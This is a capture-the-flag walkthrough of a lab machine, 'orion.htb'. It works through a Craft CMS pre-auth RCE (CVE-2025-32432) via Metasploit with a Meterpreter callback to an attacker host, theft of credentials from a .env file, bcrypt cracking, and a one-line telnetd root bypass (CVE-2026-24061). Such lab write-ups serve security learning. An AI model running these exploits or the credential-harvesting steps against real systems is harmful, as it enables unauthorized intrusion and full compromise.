**IP:** `10.129.99.19`  
**Hostname:** `orion.htb`

---

## 1. Reconnaissance

### Port Scan

```bash
nmap -sV orion.htb
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15
53/tcp open  domain?
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

Three ports are open:

- **22** — SSH (OpenSSH 8.9p1)
- **53** — DNS
- **80** — Web server (nginx)

### HTTP Enumeration

Browsing to port 80 reveals a **Craft CMS** instance running in development mode (`CRAFT_DEV_MODE=true`). An HTTP 418 error triggers a full Yii2 stack trace, leaking several useful pieces of information:

- Framework: **Yii 2.0.51**
- Installation path: `/var/www/html/craft/`
- Active session cookies visible (`CraftSessionId`, `CRAFT_CSRF_TOKEN`)
- Debug mode enabled → `devMode` confirmed

This information is enough to fingerprint the application and identify the relevant attack surface.

---

## 2. Foothold — RCE via CVE-2025-32432

### Vulnerability

**CVE-2025-32432** is a critical unauthenticated **Remote Code Execution** vulnerability (CVSS 10.0) affecting Craft CMS versions 3.x, 4.x, and 5.x prior to the patched releases (3.9.15 / 4.14.15 / 5.6.17).

The `/index.php?p=admin/actions/assets/generate-transform` endpoint insecurely deserializes a `handle` object when processing image transformations. By abusing a gadget chain in the underlying Yii framework (via `PhpManager`), an unauthenticated attacker can execute arbitrary PHP code on the server.

**Prerequisite:** a valid asset ID must exist in the Craft CMS media library.

### Exploitation

```bash
msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set rhosts orion.htb
msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set lhost 10.10.15.126
msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > run
```

```
[+] Leaked session.save_path: /var/lib/php/sessions
[+] The target is vulnerable. Session path leaked
[*] Injecting stub & triggering payload...
[*] Meterpreter session 1 opened (10.10.15.126:4444 -> 10.129.99.19:54284)
```

A Meterpreter shell is obtained as `www-data`.

---

## 3. Post-Exploitation Enumeration — Credential Discovery

### Craft CMS .env File

From the `www-data` shell, we explore the application's configuration files:

```bash
cat /var/www/html/craft/.env
```

The file reveals the following sensitive information:

```
CRAFT_SECURITY_KEY=RRS86F6i2JQKdC6kfEI7frVxA47WVMx8
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
CRAFT_DB_DATABASE=orion
```

### Database Access — Bcrypt Hash Extraction

Using the recovered credentials, we connect to the local MariaDB instance:

```bash
mysql -u root -p'SuperSecureCraft123Pass!' -h 127.0.0.1 orion
```

Querying the Craft CMS users table:

```sql
SELECT username, email, password FROM users;
```

We retrieve a bcrypt password hash for the `adam` user:

```
adam@orion.htb | $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS
```

### Offline Hash Cracking with Hashcat

```bash
hashcat -m 3200 hash.txt rockyou.txt
```

```
$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS:darkangel

Status: Cracked
Time elapsed: 1 min 7 secs
```

Credentials recovered: `adam` / `darkangel`

---

## 4. User Access — user.txt

We log in via SSH using the cracked credentials:

```bash
ssh adam@orion.htb
# password: darkangel
```

```bash
adam@orion:~$ cat user.txt
8dea8f8ab2eda0aac4c4d241367ad3a3
```

---

## 5. Privilege Escalation — CVE-2026-24061

### Enumeration with LinPEAS

Running LinPEAS on the target reveals that the **GNU Inetutils `telnetd`** service (version 2.7) is listening on `127.0.0.1:23`. The service is not exposed externally but is accessible from within the machine — a classic pattern used in HTB boxes to hide locally exploitable services.

```bash
ss -tlnp | grep 23
# 127.0.0.1:23 LISTEN
```

### Vulnerability

**CVE-2026-24061** is a critical authentication bypass (CVSS 9.8) in **GNU Inetutils `telnetd` ≤ 2.7**.

During the Telnet protocol negotiation, a client can supply environment variables to the server via the `NEW-ENVIRON` option. The `telnetd` daemon passes the `USER` variable directly to `/bin/login` without any sanitization. By setting `USER="-f root"`, the `login` binary receives the argument `-f root`, which instructs it to treat the specified user as already authenticated — skipping all password verification and spawning a root shell immediately.

### Exploitation

From `adam`'s SSH session, a single command is enough to exploit the local telnetd service:

```bash
USER="-f root" telnet -a 127.0.0.1
```

```
Connected to 127.0.0.1.

root@orion:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### root.txt

```bash
root@orion:~# cat root.txt
b371ef8dad26118b220784475c854781
```

